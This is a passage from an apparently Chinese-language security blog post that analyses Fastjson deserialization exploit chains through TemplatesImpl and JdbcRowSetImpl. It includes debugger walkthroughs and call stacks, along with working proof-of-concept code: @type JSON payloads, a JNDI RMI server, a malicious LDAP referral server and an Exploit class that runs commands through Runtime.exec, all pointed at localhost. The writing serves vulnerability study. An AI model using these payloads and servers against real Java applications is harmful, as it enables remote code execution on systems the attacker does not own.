class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在getTransletInstance调用defineTransletClasses，在defineTransletClasses方法中会根据_bytecodes来生成一个java类，生成的java类随后会被getTransletInstance方法用到生成一个实例，也就到了最终的执行命令的位置Runtime.getRuntime.exec()</p>
<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>下面我们直接在反序列化的那句代码上打上断点进行调试分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parseObject(text1, Object<span class="class">.<span class="keyword">class</span>, <span class="title">config</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>在JSON.parseObject()中会调用DefaultJSONParser.parseObject()，而DefaultJSONParser.parseObject()中调用了JavaObjectDeserializer.deserialze()函数进行反序列化：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624215615062.png" alt="image-20200624215615062"></p>
<p>跟进该函数，发现会返回去调用DefaultJSONParser.parse()函数：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624215740473.png" alt="image-20200624215740473"></p>
<p>继续调试，在DefaultJSONParser.parse()里是对JSON内容进行扫描，在switch语句中匹配上了”{“即对应12，然后对JSON数据调用DefaultJSONParser.parseObject()进行解析：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624215811151.png" alt="image-20200624215811151"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624215903686.png" alt="image-20200624215903686"></p>
<p>在DefaultJSONParser.parseObject()中，通过for语句循环解析JSON数据内容，其中skipWhitespace()函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用scanSymbol()获取双引号内的内容，这里得到第一个双引号里的内容为”@type”：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624220141214.png" alt="image-20200624220141214"></p>
<p>往下调试，判断key是否为@type且是否关闭了Feature.DisableSpecialKeyDetect设置，通过判断后调用scanSymbol()获取到了@type对应的指定类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，并调用TypeUtils.loadClass()函数加载该类：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624220701681.png" alt="image-20200624220701681"></p>
<p>跟进去，看到如红框的两个判断语句代码逻辑，是判断当前类名是否以”[“开头或以”L”开头以”;”结尾，当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说<strong>这两个判断条件是后面补丁绕过的漏洞点</strong>，值得注意：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624221008058.png" alt="image-20200624221008058"></p>
<p>往下看，通过ClassLoader.loadClass()加载到目标类后，然后将该类名和类缓存到Map中，最后返回该加载的类：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624221440346.png" alt="image-20200624221440346"></p>
<p>跟进去，循环扫描解析，解析到key为<code>_bytecodes</code>时，调用parseField()进一步解析：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624222148671.png" alt="image-20200624222148671"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624222554458.png" alt="image-20200624222554458"></p>
<p>跟进DefaultFieldDeserializer.parseField()函数中，解析出<code>_bytecodes</code>对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624222706533.png" alt="image-20200624222706533"></p>
<p>FieldDeserializer.setValue()函数，看到是调用<code>private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes</code>的set方法来设置<code>_bytecodes</code>的值：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624222755522.png" alt="image-20200624222755522"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624223811017.png" alt="image-20200624223811017"></p>
<p>返回之后，后面也是一样的，循环处理JSON数据中的其他键值内容。</p>
<p>经过漫长的跟进之后，当解析到<code>_outputProperties</code>的内容时，看到前面的下划线被去掉了：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624225046512.png" alt="image-20200624225046512"></p>
<p>跟进该方法，发现会通过反射机制调用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624225226724.png" alt="image-20200624225226724"></p>
<p>从invoke的地方跟进去，看到在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624225351667.png" alt="image-20200624225351667"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624230437144.png" alt="image-20200624230437144"></p>
<p>跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/17.png" alt="img"></p>
<p>继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/18.png" alt="img"></p>
<p>再往下就是新建Test类实例的过程，并调用Test类的构造函数：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/19.png" alt="img"></p>
<p>再之后就是弹计算器了。</p>
<p><strong>整个调试过程主要的函数调用栈如下：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">11</span>, Test</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">57</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">526</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">383</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">408</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">439</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">460</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">606</span>, Method (java.lang.reflect)</span><br><span class="line">setValue:<span class="number">85</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">83</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseField:<span class="number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">188</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:<span class="number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">deserialze:<span class="number">45</span>, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:<span class="number">639</span>, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parseObject:<span class="number">339</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:<span class="number">302</span>, JSON (com.alibaba.fastjson)</span><br><span class="line">main:<span class="number">35</span>, PoC</span><br></pre></td></tr></table></figure>

<p>最后的调用过滤再具体说下：在getTransletInstance()函数中调用了defineTransletClasses()函数，在defineTransletClasses()函数中会根据_bytecodes来生成一个Java类（这里为恶意类Test），其构造方法中含有命令执行代码，生成的Java类随后会被newInstance()方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。</p>
<h3 id="为什么恶意类需要继承AbstractTranslet类"><a href="#为什么恶意类需要继承AbstractTranslet类" class="headerlink" title="为什么恶意类需要继承AbstractTranslet类?"></a>为什么恶意类需要继承AbstractTranslet类?</h3><p>在前面的调试分析中，getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，我们跟进这个defineTransletClasses()方法查看下：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624231143787.png" alt="image-20200624231143787"></p>
<p>可以看到有个逻辑会判断恶意类的父类类名是否是<code>ABSTRACT_TRANSLET</code>，是的话<code>_transletIndex</code>变量的值被设置为0，到后面的if判断语句中就不会被识别为&lt;0而抛出异常终止程序。</p>
<h3 id="为什么需要对-bytecodes进行Base64编码"><a href="#为什么需要对-bytecodes进行Base64编码" class="headerlink" title="为什么需要对_bytecodes进行Base64编码"></a>为什么需要对_bytecodes进行Base64编码</h3><p>可以发现，在PoC中的<code>_bytecodes</code>字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对<code>_bytecodes</code>字段进行Base64加密处理。</p>
<p>其中Fastjson的处理代码如下，在ObjectArrayCodec.deserialze()函数中会调用lexer.bytesValue()对byte数组进行处理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> JSONLexer lexer = parser.lexer;</span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.NULL) &#123;</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = lexer.bytesValue();</span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">return</span> (T) bytes;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们调试看看ObjectArrayCodec.deserialze()函数是在哪调用的，其实它的调用实在setValue()前面进行处理的：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/20.png" alt="img"></p>
<p>跟进几层，看到调用栈就清楚了，实在ObjectArrayCodec.deserialze()函数中调用到的：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/21.png" alt="img"></p>
<p>跟进bytesValue()函数，就是对<code>_bytecodes</code>的内容进行Base64解码：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/22.png" alt="img"></p>
<h3 id="为什么需要设置-tfactory为"><a href="#为什么需要设置-tfactory为" class="headerlink" title="为什么需要设置_tfactory为{}"></a>为什么需要设置_tfactory为{}</h3><p>由前面的调试分析知道，在getTransletInstance()函数中调用了defineTransletClasses()函数，defineTransletClasses()函数是用于生成Java类的，在其中会新建一个转换类加载器，其中会调用到<code>_tfactory.getExternalExtensionsMap()</code>方法，若<code>_tfactory</code>为null则会导致这段代码报错、从而无法生成恶意类，进而无法成功攻击利用：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/24.png" alt="img"></p>
<h3 id="为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法"><a href="#为什么反序列化调用getter方法时会调用到TemplatesImpl-getOutputProperties-方法" class="headerlink" title="为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法?"></a>为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法?</h3><p>getOutputProperties()方法是个无参数的非静态的getter方法，以get开头且第四个字母为大写形式，其返回值类型是Properties即继承自Map类型，满足之前说的Fastjson反序列化时会调用的getter方法的条件，因此在使用Fastjson对TemplatesImpl类对象进行反序列化操作时会自动调用getOutputProperties()方法。</p>
<h3 id="如何关联-outputProperties与getOutputProperties-方法"><a href="#如何关联-outputProperties与getOutputProperties-方法" class="headerlink" title="如何关联_outputProperties与getOutputProperties()方法?"></a>如何关联_outputProperties与getOutputProperties()方法?</h3><p>Fastjson会语义分析JSON字符串，根据字段key，调用fieldList数组中存储的相应方法进行变量初始化赋值。</p>
<p>具体的代码在JavaBeanDeserializer.parseField()中，其中调用了smartMatch()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType, Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer; <span class="comment">// xxx</span></span><br><span class="line"></span><br><span class="line">        FieldDeserializer fieldDeserializer = smartMatch(key);</span><br></pre></td></tr></table></figure>

<p>在JavaBeanDeserializer.smartMatch()方法中，会替换掉字段key中的<code>_</code>，从而使得<code>_outputProperties</code>变成了outputProperties：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200624232010974.png" alt="image-20200624232010974"></p>
<p>既然已经得到了outputProperties属性了，那么自然而然就会调用到getOutputProperties()方法了。</p>
<p>那么整个调用栈如下；</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/diaoyonglian.png" alt="调用链"></p>
<p>简单来说就是：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">JSON.parseObject</span><br><span class="line">...</span><br><span class="line">JavaBeanDeserializer.deserialze</span><br><span class="line">...</span><br><span class="line">FieldDeserializer.setValue</span><br><span class="line">...</span><br><span class="line">TemplatesImpl.getOutputProperties</span><br><span class="line">TemplatesImpl.newTransformer</span><br><span class="line">TemplatesImpl.getTransletInstance</span><br><span class="line">...</span><br><span class="line">Runtime.getRuntime().exec</span><br></pre></td></tr></table></figure>

<h2 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h2><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。</p>
<h3 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h3><p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p>
<p>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。</p>
<h3 id="JNDI-RMI复现利用"><a href="#JNDI-RMI复现利用" class="headerlink" title="JNDI+RMI复现利用"></a>JNDI+RMI复现利用</h3><p>PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>JNDIServer.java，RMI服务，注册表绑定了Exploit服务，该服务是指向恶意Exploit.class文件所在服务器的Reference：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//http://127.0.0.1:8000/Exploit.class即可</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exloit"</span>,</span><br><span class="line">                <span class="string">"Exploit"</span>,<span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"Exploit"</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Exploit.java，恶意类，单独编译成class文件并放置于RMI服务指向的三方Web服务中，作为一个Factory绑定在注册表服务中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JdbcRowSetImplPoc.java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcRowSetImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先运行JNDI的RMI服务，将恶意类Exploit.class单独放置于一个三方的Web服务中，然后运行PoC即可弹计算器，且看到访问了含有恶意类的Web服务,注意这次和上次一样，恶意类里面还是不要写package的名字：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704212530669.png" alt="image-20200704212530669"></p>
<h3 id="JNDI-LDAP复现利用"><a href="#JNDI-LDAP复现利用" class="headerlink" title="JNDI+LDAP复现利用"></a>JNDI+LDAP复现利用</h3><p>PoC如下，跟RMI的相比只是改了URL而已：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"ldap://localhost:1389/Exploit"</span>, <span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>但是相比RMI的利用方式，优势在于JDK的限制更低了。</p>
<p>LdapServer.java，区别在于将之前的RMI服务端换成LDAP服务端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8000/#Exploit"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和RMI同样的利用方式，成功弹计算器：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704213516863.png" alt="image-20200704213516863"></p>
<h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><p>先在JSON.parse(PoC)打下断点，开始调试。大体流程跟之前TemplatesImpl是一致的，这里主要跟进一下不一样的地方。先在parseObject中加载目标Class：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704221509434.png" alt="image-20200704221509434"></p>
<p>往下调试，调用了FastjsonASMDeserializer.deserialze()函数对该类进行反序列化操作：</p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704221723639.png" alt="image-20200704221723639"></p>
<p>继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可。</p>
<p>由于PoC设置了dataSourceName键值和autoCommit键值，因此在JdbcRowSetImpl中的setDataSourceName()和setAutoCommit()函数都会被调用，因为它们均满足前面说到的Fastjson在反序列化时会自动调用的setter方法的特征。</p>
<p>先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址：</p>
